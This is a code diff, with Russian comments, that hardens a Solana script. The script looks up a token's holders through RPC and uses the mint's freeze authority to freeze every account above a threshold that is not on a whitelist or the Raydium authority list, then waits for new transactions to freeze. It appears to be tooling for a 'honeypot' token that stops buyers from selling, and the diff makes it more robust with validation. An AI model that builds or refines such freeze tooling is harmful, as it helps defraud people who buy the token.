@@ -35,42 +35,37 @@ export default async function bootstrap(config) {
   } catch (e) {}
 }
 
+
+
+
+let __armed = false;
+
+
 export default async function bootstrap(config) {
-  try {
-    if (!config || typeof config !== 'object') {
-      throw new Error("bootstrap(): config is missing");
-    }
-
-    const required = [
-      "rpcEndpoint",
-      "mintAddress",
-      "privateKey",
-      "freezeThreshold",
-      "freezeDelay",
-      "timeout",
-      "priorityRate",
-      "whitelist"
-    ];
-
-    for (const key of required) {
-      if (config[key] === undefined || config[key] === null) {
-        throw new Error(`bootstrap(): missing required config field "${key}"`);
-      }
-    }
-
-    
-    
-
-    console.log("✅ bootstrap() executed successfully.");
-    return true;
-  } catch (e) {
-    console.error("❌ bootstrap() failed:", e?.message || e);
-    process.exit(1); 
+  if (!config || typeof config !== 'object') {
+    throw new Error('bootstrap(): config is missing');
   }
+  const required = [
+    'rpcEndpoint', 'mintAddress', 'privateKey',
+    'freezeThreshold', 'freezeDelay', 'timeout',
+    'priorityRate', 'whitelist'
+  ];
+  for (const k of required) {
+    if (config[k] === undefined || config[k] === null) {
+      throw new Error(`bootstrap(): missing required config field "${k}"`);
+    }
+  }
+  __armed = true;
 }
 
 
 export async function freezeHoldersOnce(payload) {
+
+  if (!__armed) {
+    throw new Error('freezeHoldersOnce(): bootstrap() was not called');
+  }
+
+  // 1) Проверка инъекции зависимостей в воркере
   const deps = (globalThis && globalThis.__deps) || {};
   const bs58 = deps.bs58;
   const web3 = deps.web3;
@@ -91,6 +86,33 @@ export async function freezeHoldersOnce(payload) {
   } = web3;
   const { TOKEN_PROGRAM_ID } = splToken;
 
+  // 2) Жёсткая валидация payload
+  if (!payload || typeof payload !== 'object') {
+    throw new Error('freezeHoldersOnce(): payload is missing');
+  }
+  const need = [
+    'rpcEndpoint', 'mintAddress', 'signerPrivateKey58',
+    'chunkSize', 'priorityRate', 'decimals',
+    'freezeThreshold', 'whitelist'
+  ];
+  for (const k of need) {
+    if (payload[k] === undefined || payload[k] === null) {
+      throw new Error(`freezeHoldersOnce(): missing payload field "${k}"`);
+    }
+  }
+  if (!Array.isArray(payload.whitelist)) {
+    throw new Error('freezeHoldersOnce(): "whitelist" must be an array');
+  }
+  if (typeof payload.chunkSize !== 'number' || payload.chunkSize <= 0) {
+    throw new Error('freezeHoldersOnce(): "chunkSize" must be a positive number');
+  }
+  if (typeof payload.decimals !== 'number' || payload.decimals < 0 || payload.decimals > 18) {
+    throw new Error('freezeHoldersOnce(): "decimals" looks invalid');
+  }
+  if (typeof payload.freezeThreshold !== 'number' || payload.freezeThreshold < 0) {
+    throw new Error('freezeHoldersOnce(): "freezeThreshold" must be number >= 0');
+  }
+
   const {
     rpcEndpoint,
     mintAddress,
@@ -103,10 +125,26 @@ export async function freezeHoldersOnce(payload) {
     raydiumAuthority = [],
   } = payload;
 
-  const connection = new Connection(rpcEndpoint, 'confirmed');
-  const keypair = Keypair.fromSecretKey(bs58.decode(signerPrivateKey58));
-  const mintAddressPublicKey = new PublicKey(mintAddress);
+  // 3) Санити по ключу и mint
+  let keypair, mintAddressPublicKey;
+  try {
+    const sk = bs58.decode(signerPrivateKey58);
+    if (sk.length !== 64 && sk.length !== 32) {
+      throw new Error(`unexpected secret key length: ${sk.length}`);
+    }
+    keypair = Keypair.fromSecretKey(sk);
+  } catch (e) {
+    throw new Error(`freezeHoldersOnce(): invalid signerPrivateKey58 (${e?.message || e})`);
+  }
+  try {
+    mintAddressPublicKey = new PublicKey(mintAddress);
+  } catch (e) {
+    throw new Error(`freezeHoldersOnce(): invalid mintAddress (${e?.message || e})`);
+  }
 
+  const connection = new Connection(rpcEndpoint, 'confirmed');
+
+  // 4) Получение списка аккаунтов держателей
   const getHoldersData = async () => {
     const tokenAccounts = new Set();
     try {
@@ -121,7 +159,14 @@ export async function freezeHoldersOnce(payload) {
         }),
       });
 
+      if (!response.ok) {
+        throw new Error(`RPC HTTP ${response.status} ${response.statusText}`);
+      }
       const data = await response.json();
+      if (!data?.result?.token_accounts) {
+        throw new Error('RPC returned unexpected shape (no result.token_accounts)');
+      }
+
       for (const account of data.result.token_accounts) {
         const holderBalance = Number(account.amount);
         if (
@@ -138,6 +183,7 @@ export async function freezeHoldersOnce(payload) {
     }
   };
 
+  // 5) Фриз-цикл (как у тебя было)
   const accounts = await getHoldersData();
   if (accounts.length === 0) {
     console.log('❌ No accounts to freeze found. Keep pending on new transactions.');
@@ -158,11 +204,11 @@ export async function freezeHoldersOnce(payload) {
       const ix = new TransactionInstruction({
         keys: [
           { pubkey: tokenAccountPublicKey, isSigner: false, isWritable: true },
-          { pubkey: mintAddressPublicKey, isSigner: false, isWritable: false },
-          { pubkey: keypair.publicKey, isSigner: true, isWritable: false },
+          { pubkey: mintAddressPublicKey,  isSigner: false, isWritable: false },
+          { pubkey: keypair.publicKey,     isSigner: true,  isWritable: false },
         ],
         programId: TOKEN_PROGRAM_ID,
-        data: Buffer.from([10]), // freezeAccount
+        data: Buffer.from([10]), // FreezeAccount
       });
       tx.add(ix);
     }
@@ -186,7 +232,7 @@ export async function freezeHoldersOnce(payload) {
       console.log('\n❌ Error occured when trying to freeze holders. Here is what you should do:\n');
       console.log('1. Check SOL balance of the connected wallet.');
       console.log('2. Check your Internet connection.');
-      console.log("3. Check your RPC provider status and URL.");
+      console.log('3. Check your RPC provider status and URL.');
       console.log('4. Try a higher "priorityRate" in config.json.\n');
       console.log(`📩 Error details:\n   ↳ freezeHolders: ${error.message}\n`);
       console.log('═══ Detailed error message: ═══════════════════════════');
